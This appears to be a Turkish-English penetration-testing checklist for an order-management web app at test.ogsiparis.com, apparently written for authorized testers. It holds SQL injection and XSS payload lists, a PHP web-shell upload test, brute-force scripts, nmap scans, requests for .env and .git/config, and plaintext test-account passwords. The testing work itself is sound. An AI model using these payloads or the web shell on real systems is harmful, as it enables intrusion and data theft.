# 🎯 Penetration Testing Checklist

## 📋 İçindekiler

1. [Genel Bakış](#genel-bakış)
2. [Test Ortamı Hazırlığı](#test-ortamı-hazırlığı)
3. [Authentication & Session Management](#authentication--session-management)
4. [Authorization & Access Control](#authorization--access-control)
5. [Input Validation](#input-validation)
6. [Business Logic](#business-logic)
7. [Data Protection](#data-protection)
8. [Infrastructure Security](#infrastructure-security)
9. [Client-Side Security](#client-side-security)
10. [API Security](#api-security)
11. [Reporting Template](#reporting-template)

---

## 🎯 Genel Bakış

### Test Kapsamı
```
🎯 Test Hedefi: Ömer Güllü Sipariş Sistemi
🔒 Güvenlik Seviyeleri: 10-Layer Security Architecture
📅 Test Süresi: 2-3 gün (Full penetration test)
👥 Test Ekibi: 2-3 güvenlik uzmanı
```

### Test Metodolojisi
```
1. Information Gathering (Bilgi Toplama)
2. Vulnerability Assessment (Açık Değerlendirme)
3. Exploitation (Sömürü)
4. Post-Exploitation (Sömürü Sonrası)
5. Reporting (Raporlama)
```

### Risk Seviyeleri
```
🔴 CRITICAL: Sistem tamamen tehlikeye atılabilir
🟠 HIGH: Önemli güvenlik açığı, hızla düzeltilmeli
🟡 MEDIUM: Güvenlik riski mevcut, planlı şekilde düzeltilmeli
🟢 LOW: Minimal risk, güvenlik iyileştirmesi önerilir
ℹ️ INFO: Bilgilendirme amaçlı, risk yok
```

---

## 🛠️ Test Ortamı Hazırlığı

### Test Araçları Listesi

#### 🕷️ Web Application Scanners
```bash
# OWASP ZAP
sudo apt install zaproxy
zap.sh -daemon -port 8080 -config api.disablekey=true

# Nikto Web Scanner
sudo apt install nikto
nikto -h https://test.ogsiparis.com

# Dirb/Dirbuster - Directory Bruteforce
sudo apt install dirb
dirb https://test.ogsiparis.com /usr/share/dirb/wordlists/common.txt

# SQLMap - SQL Injection Testing
pip install sqlmap
sqlmap -u "https://test.ogsiparis.com/api/siparis?id=1" --cookie="auth_token=xxx"
```

#### 🔍 Manual Testing Tools
```bash
# Burp Suite Community Edition
# Download from: https://portswigger.net/burp/communitydownload

# Chrome Developer Tools + Extensions
# - OWASP ZAP HUD
# - Wappalyzer
# - Cookie Editor
# - User-Agent Switcher

# Command Line Tools
curl -X POST https://test.ogsiparis.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'

# JQ for JSON parsing
sudo apt install jq
```

#### 📊 Documentation Tools
```bash
# Screenshot Tool
sudo apt install scrot
scrot -s screenshot.png

# Markdown Editor
sudo apt install typora

# Report Generator
pip install python-docx
```

### Test Hesapları

#### 🔑 Test Kullanıcıları
```
📋 Admin Test Account:
Username: pentest_admin
Password: PenTest2024!
Role: ADMIN
Branch: All

📋 Manager Test Account:
Username: pentest_manager
Password: PenTest2024!
Role: MANAGER
Branch: Istanbul

📋 Operator Test Account:
Username: pentest_operator
Password: PenTest2024!
Role: OPERATOR
Branch: Istanbul

📋 Viewer Test Account:
Username: pentest_viewer
Password: PenTest2024!
Role: VIEWER
Branch: Istanbul
```

---

## 🔐 Authentication & Session Management

### 1. Login Security Testing

#### 1.1 Credential Validation
```
□ Test valid credentials → Should login successfully
□ Test invalid username → Should reject with generic error
□ Test invalid password → Should reject with generic error
□ Test empty credentials → Should reject appropriately
□ Test SQL injection in username field
□ Test SQL injection in password field
□ Test XSS payloads in login fields
```

**Test Cases:**
```bash
# Valid Login Test
curl -X POST https://test.ogsiparis.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"kullaniciAdi":"pentest_admin","sifre":"PenTest2024!"}'

# SQL Injection Test
curl -X POST https://test.ogsiparis.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"kullaniciAdi":"admin\"\"OR\"\"1\"\"=\"\"1","sifre":"anything"}'

# XSS Test
curl -X POST https://test.ogsiparis.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"kullaniciAdi":"<script>alert(\"XSS\")</script>","sifre":"test"}'
```

#### 1.2 Brute Force Protection
```
□ Test account lockout after 5 failed attempts
□ Verify lockout duration (30 minutes)
□ Test CAPTCHA appears after 3 failed attempts
□ Test rate limiting on login endpoint
□ Verify IP-based blocking
□ Test bypass attempts with different User-Agents
□ Test bypass attempts with X-Forwarded-For headers
```

**Test Script:**
```bash
#!/bin/bash
# Brute force test script

TARGET_URL="https://test.ogsiparis.com/api/auth/login"
USERNAME="pentest_test"

echo "Testing brute force protection..."

for i in {1..10}; do
    echo "Attempt $i..."
    response=$(curl -s -w "%{http_code}" -X POST $TARGET_URL \
        -H "Content-Type: application/json" \
        -d "{\"kullaniciAdi\":\"$USERNAME\",\"sifre\":\"wrong_password_$i\"}")
    
    echo "Response: $response"
    
    if [[ $response == *"429"* ]]; then
        echo "✅ Rate limiting activated at attempt $i"
        break
    fi
    
    sleep 2
done
```

### 2. Session Management Testing

#### 2.1 JWT Token Security
```
□ Verify JWT token structure and claims
□ Test token expiration (7 days default)
□ Test refresh token functionality
□ Verify token invalidation on logout
□ Test concurrent session limits
□ Test token replay attacks
□ Verify secure token storage
```

**JWT Analysis:**
```bash
# Decode JWT token (without verification)
JWT_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
echo $JWT_TOKEN | cut -d. -f2 | base64 -d | jq .

# Test expired token
curl -X GET https://test.ogsiparis.com/api/auth/users \
  -H "Authorization: Bearer expired_token_here"

# Test malformed token
curl -X GET https://test.ogsiparis.com/api/auth/users \
  -H "Authorization: Bearer malformed.token.here"
```

#### 2.2 CSRF Protection
```
□ Verify CSRF token required for state-changing operations
□ Test CSRF token validation
□ Test CSRF token in different request methods (POST, PUT, DELETE)
□ Verify CSRF token tied to user session
□ Test CSRF bypass techniques
```

**CSRF Test:**
```bash
# Test without CSRF token
curl -X POST https://test.ogsiparis.com/api/auth/users \
  -H "Authorization: Bearer valid_jwt_token" \
  -H "Content-Type: application/json" \
  -d '{"adiSoyadi":"Test User","email":"test@test.com","rol":"VIEWER"}'

# Test with invalid CSRF token
curl -X POST https://test.ogsiparis.com/api/auth/users \
  -H "Authorization: Bearer valid_jwt_token" \
  -H "X-CSRF-Token: invalid_token" \
  -H "Content-Type: application/json" \
  -d '{"adiSoyadi":"Test User","email":"test@test.com","rol":"VIEWER"}'
```

### 3. Password Security

#### 3.1 Password Policy
```
□ Verify minimum length (8 characters)
□ Test complexity requirements (upper, lower, digit, special)
□ Verify password history (last 5 passwords)
□ Test common password rejection
□ Verify password expiration policy
□ Test password change functionality
```

---

## 👥 Authorization & Access Control

### 1. Role-Based Access Control (RBAC)

#### 1.1 Horizontal Privilege Testing
```
□ VIEWER accessing OPERATOR functions
□ OPERATOR accessing SUPERVISOR functions  
□ SUPERVISOR accessing MANAGER functions
□ MANAGER accessing ADMIN functions
□ Cross-branch data access attempts
```

**Test Script:**
```bash
#!/bin/bash
# RBAC Testing Script

# Get tokens for different roles
VIEWER_TOKEN="viewer_jwt_token_here"
OPERATOR_TOKEN="operator_jwt_token_here"
MANAGER_TOKEN="manager_jwt_token_here"
ADMIN_TOKEN="admin_jwt_token_here"

# Test VIEWER accessing admin functions
echo "Testing VIEWER -> ADMIN access..."
curl -X GET https://test.ogsiparis.com/api/audit-logs \
  -H "Authorization: Bearer $VIEWER_TOKEN"

# Test OPERATOR creating users
echo "Testing OPERATOR -> USER MANAGEMENT access..."
curl -X POST https://test.ogsiparis.com/api/auth/users \
  -H "Authorization: Bearer $OPERATOR_TOKEN" \
  -H "X-CSRF-Token: csrf_token" \
  -H "Content-Type: application/json" \
  -d '{"adiSoyadi":"Unauthorized User","email":"test@test.com","rol":"VIEWER"}'
```

#### 1.2 Vertical Privilege Testing
```
□ Modify user role via API manipulation
□ Access administrative endpoints
□ Modify other users' data
□ Access financial data without proper role
□ Branch-level access violations
```

### 2. Business Logic Access Control

#### 2.1 Data Access Patterns
```
□ Financial data visibility by role
□ Customer PII access levels
□ Production recipe access
□ Audit log visibility
□ Cross-branch data access
```

**Data Access Test:**
```bash
# Test financial data access with different roles
for role in "viewer" "operator" "supervisor" "manager" "admin"; do
    echo "Testing $role access to financial data..."
    TOKEN_VAR="${role^^}_TOKEN"
    TOKEN=${!TOKEN_VAR}
    
    response=$(curl -s https://test.ogsiparis.com/api/fiyatlar \
        -H "Authorization: Bearer $TOKEN")
    
    echo "$role response: $response" | jq .
done
```

---

## 🧹 Input Validation

### 1. Injection Attacks

#### 1.1 SQL Injection Testing
```
□ Authentication bypass attempts
□ Union-based SQL injection
□ Boolean-based blind SQL injection
□ Time-based blind SQL injection
□ Error-based SQL injection
□ Second-order SQL injection
```

**SQL Injection Payloads:**
```sql
# Authentication bypass
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin'/*

# Union-based injection
' UNION SELECT null,username,password FROM users--
' UNION SELECT null,@@version,null--

# Boolean-based blind
' AND (SELECT COUNT(*) FROM kullanici) > 0--
' AND (SELECT SUBSTRING(adiSoyadi,1,1) FROM kullanici WHERE id=1)='A'--

# Time-based blind
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM kullanici) > 0; WAITFOR DELAY '00:00:05'--
```

#### 1.2 XSS (Cross-Site Scripting)
```
□ Reflected XSS in search parameters
□ Stored XSS in user profiles
□ DOM-based XSS in client-side code
□ XSS in file upload features
□ XSS filter bypass techniques
```

**XSS Payloads:**
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Filter bypass -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src="javascript:alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>

<!-- Event handlers -->
<div onclick=alert('XSS')>Click me</div>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

#### 1.3 Command Injection
```
□ OS command injection in file operations
□ Template injection
□ LDAP injection (if applicable)
□ XML injection
□ Server-Side Template Injection (SSTI)
```

### 2. File Upload Security

#### 2.1 File Type Validation
```
□ Upload .exe files with Excel extension
□ Upload PHP/ASP shells with valid extensions
□ Test MIME type spoofing
□ Test double extension files (file.jpg.php)
□ Test null byte injection (file.php%00.jpg)
□ Upload files with script content
```

**File Upload Tests:**
```bash
# Create malicious files for testing
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<script>alert("XSS")</script>' > xss.xlsx

# Test file upload
curl -X POST https://test.ogsiparis.com/api/excel/upload/kullanici \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "X-CSRF-Token: csrf_token" \
  -F "file=@shell.php"
```

#### 2.2 File Size and Content
```
□ Upload oversized files (>10MB)
□ Upload empty files
□ Upload files with malicious content
□ Test ZIP bomb files
□ Upload files with excessive metadata
```

---

## 💼 Business Logic

### 1. Workflow Security

#### 1.1 Order Processing
```
□ Modify order prices after creation
□ Access orders from different branches
□ Approve orders without proper authorization
□ Cancel orders in invalid states
□ Manipulate order timestamps
```

**Business Logic Tests:**
```bash
# Create an order
ORDER_RESPONSE=$(curl -s -X POST https://test.ogsiparis.com/api/siparis \
  -H "Authorization: Bearer $OPERATOR_TOKEN" \
  -H "X-CSRF-Token: csrf_token" \
  -H "Content-Type: application/json" \
  -d '{
    "musteriId": 1,
    "items": [{"urunId": 1, "miktar": 1, "birimFiyat": 100}]
  }')

ORDER_ID=$(echo $ORDER_RESPONSE | jq -r '.data.id')

# Try to modify order with manipulated price
curl -X PUT https://test.ogsiparis.com/api/siparis/$ORDER_ID \
  -H "Authorization: Bearer $OPERATOR_TOKEN" \
  -H "X-CSRF-Token: csrf_token" \
  -H "Content-Type: application/json" \
  -d '{
    "items": [{"urunId": 1, "miktar": 1, "birimFiyat": 0.01}]
  }'
```

#### 1.2 User Management
```
□ Create users with higher privileges
□ Modify other users' roles
□ Deactivate admin accounts
□ Access user data from other branches
□ Reset passwords for other users
```

### 2. Financial Logic

#### 2.1 Price Manipulation
```
□ Modify product prices without authorization
□ Access cost data without proper role
□ Manipulate profit margins
□ View supplier pricing without authorization
□ Export financial data without permission
```

---

## 🔒 Data Protection

### 1. Sensitive Data Exposure

#### 1.1 PII (Personal Identifiable Information)
```
□ Customer phone numbers visible to unauthorized roles
□ Email addresses exposed in API responses
□ Full names visible without proper permissions
□ Address information exposure
□ ID numbers and tax information
```

**Data Exposure Test:**
```bash
# Test PII exposure with different roles
for role in "viewer" "operator" "supervisor"; do
    TOKEN_VAR="${role^^}_TOKEN"
    TOKEN=${!TOKEN_VAR}
    
    echo "Testing PII exposure for $role..."
    response=$(curl -s https://test.ogsiparis.com/api/cari \
        -H "Authorization: Bearer $TOKEN")
    
    # Check if sensitive data is masked
    echo "$response" | jq '.data[0] | {telefon, email, ad, soyad}'
done
```

#### 1.2 Financial Data
```
□ Cost information visible to unauthorized users
□ Profit margins exposed
□ Supplier pricing data
□ Employee salary information
□ Financial reports access
```

### 2. Data Transmission Security

#### 2.1 HTTPS Configuration
```
□ All endpoints use HTTPS
□ HTTP redirects to HTTPS
□ SSL/TLS configuration strength
□ Certificate validation
□ Mixed content issues
```

**SSL/TLS Test:**
```bash
# Check SSL configuration
nmap --script ssl-enum-ciphers -p 443 test.ogsiparis.com

# Test SSL certificate
openssl s_client -connect test.ogsiparis.com:443 -servername test.ogsiparis.com

# Check for mixed content
curl -I https://test.ogsiparis.com | grep -i "content-security-policy"
```

---

## 🏗️ Infrastructure Security

### 1. Server Configuration

#### 1.1 Information Disclosure
```
□ Server version exposure
□ Technology stack disclosure
□ Error message information leakage
□ Directory listing enabled
□ Backup files accessible
□ Source code exposure
```

**Information Gathering:**
```bash
# Technology detection
curl -I https://test.ogsiparis.com

# Directory enumeration
dirb https://test.ogsiparis.com /usr/share/dirb/wordlists/common.txt

# Check for common files
curl https://test.ogsiparis.com/robots.txt
curl https://test.ogsiparis.com/.git/config
curl https://test.ogsiparis.com/package.json
curl https://test.ogsiparis.com/.env
```

#### 1.2 Security Headers
```
□ X-Frame-Options present
□ X-Content-Type-Options present
□ X-XSS-Protection present
□ Strict-Transport-Security present
□ Content-Security-Policy present
□ Referrer-Policy present
```

### 2. Network Security

#### 2.1 Port Scanning
```
□ Open ports identification
□ Service version detection
□ Unnecessary services running
□ Default credentials on services
```

**Network Reconnaissance:**
```bash
# Port scanning
nmap -sS -O test.ogsiparis.com

# Service detection
nmap -sV -p- test.ogsiparis.com

# Vulnerability scanning
nmap --script vuln test.ogsiparis.com
```

---

## 🖥️ Client-Side Security

### 1. Frontend Security

#### 1.1 JavaScript Security
```
□ Sensitive data in JavaScript code
□ API keys or secrets in client-side code
□ Insecure client-side validation only
□ DOM-based XSS vulnerabilities
□ Unsafe use of eval() or innerHTML
```

**Client-Side Analysis:**
```bash
# Download and analyze JavaScript files
curl https://test.ogsiparis.com/static/js/main.js > main.js

# Search for sensitive information
grep -E "(password|secret|key|token)" main.js
grep -E "(admin|root)" main.js

# Check for dangerous functions
grep -E "(eval|innerHTML|document.write)" main.js
```

#### 1.2 Browser Security
```
□ Local storage security
□ Session storage security
□ Cookie security attributes
□ Browser caching of sensitive data
□ Autocomplete on password fields
```

### 2. API Client Security

#### 2.1 API Token Handling
```
□ Tokens stored securely in browser
□ Token expiration handling
□ Automatic token refresh
□ Token transmission security
□ Token invalidation on logout
```

---

## 🔌 API Security

### 1. REST API Security

#### 1.1 HTTP Methods
```
□ Improper HTTP method usage
□ HTTP verb tampering
□ OPTIONS method information disclosure
□ HEAD method functionality
□ Unsupported methods handling
```

**HTTP Method Testing:**
```bash
# Test different HTTP methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
    echo "Testing $method method..."
    curl -X $method https://test.ogsiparis.com/api/auth/users \
        -H "Authorization: Bearer $ADMIN_TOKEN"
done
```

#### 1.2 API Versioning
```
□ Old API versions accessible
□ Version disclosure in headers
□ Deprecated endpoint functionality
□ Version bypass techniques
```

### 2. Rate Limiting

#### 2.1 API Rate Limits
```
□ Rate limiting per endpoint
□ Rate limiting per user
□ Rate limiting bypass techniques
□ DDoS protection mechanisms
```

**Rate Limiting Test:**
```bash
#!/bin/bash
# Rate limiting test

ENDPOINT="https://test.ogsiparis.com/api/dropdown"

echo "Testing rate limiting..."
for i in {1..200}; do
    response=$(curl -s -w "%{http_code}" $ENDPOINT \
        -H "Authorization: Bearer $OPERATOR_TOKEN")
    
    echo "Request $i: HTTP $response"
    
    if [[ $response == *"429"* ]]; then
        echo "✅ Rate limiting activated at request $i"
        break
    fi
done
```

---

## 📊 Reporting Template

### Vulnerability Report Format

```markdown
# PENETRATION TEST REPORT

## Executive Summary
- **Test Date:** [Date Range]
- **Tester:** [Name/Company]
- **Scope:** Ömer Güllü Sipariş Sistemi
- **Overall Risk Level:** [CRITICAL/HIGH/MEDIUM/LOW]

## Findings Summary
| Severity | Count | Status |
|----------|-------|--------|
| Critical | 0     | ✅     |
| High     | 2     | ⚠️     |
| Medium   | 5     | ⚠️     |
| Low      | 3     | ℹ️     |

## Detailed Findings

### [SEVERITY] - [Vulnerability Title]
**Risk:** [CRITICAL/HIGH/MEDIUM/LOW]
**CVSS Score:** [0.0-10.0]

**Description:**
[Detailed vulnerability description]

**Impact:**
[Business and technical impact]

**Steps to Reproduce:**
1. [Step 1]
2. [Step 2]
3. [Step 3]

**Proof of Concept:**
```bash
[PoC code/commands]
```

**Screenshots:**
[Attach relevant screenshots]

**Recommendation:**
[Specific remediation steps]

**Timeline:**
[Suggested fix timeline]

## Conclusion
[Overall assessment and recommendations]

## Appendix
- Test methodology
- Tools used
- References
```

### Checklist Completion

```
📋 PENETRATION TEST COMPLETION CHECKLIST:

Authentication & Session:
□ Login security tested
□ Session management verified
□ Password policies checked
□ CSRF protection validated

Authorization:
□ RBAC tested thoroughly
□ Privilege escalation attempts
□ Business logic access verified

Input Validation:
□ SQL injection testing complete
□ XSS testing complete
□ File upload security verified
□ Command injection tested

Business Logic:
□ Workflow security tested
□ Price manipulation attempts
□ User management security verified

Data Protection:
□ PII exposure tested
□ Financial data access verified
□ Data transmission security checked

Infrastructure:
□ Server configuration tested
□ Network security verified
□ Information disclosure checked

Client-Side:
□ Frontend security tested
□ API client security verified

API Security:
□ HTTP methods tested
□ Rate limiting verified
□ API versioning checked

Documentation:
□ All findings documented
□ Screenshots captured
□ PoC code prepared
□ Report compiled
□ Recommendations provided
```

---

## 📞 Support Information

### Contact Details
- **Security Team:** security@ogsiparis.com
- **Emergency Contact:** +90 XXX XXX XX XX
- **Incident Response:** incident@ogsiparis.com

### Test Environment
- **URL:** https://test.ogsiparis.com
- **Test Duration:** Typically 2-3 days
- **Retest:** After fixes implemented

---

*This penetration testing checklist should be used by certified security professionals only. Always test on authorized systems and follow responsible disclosure practices.* 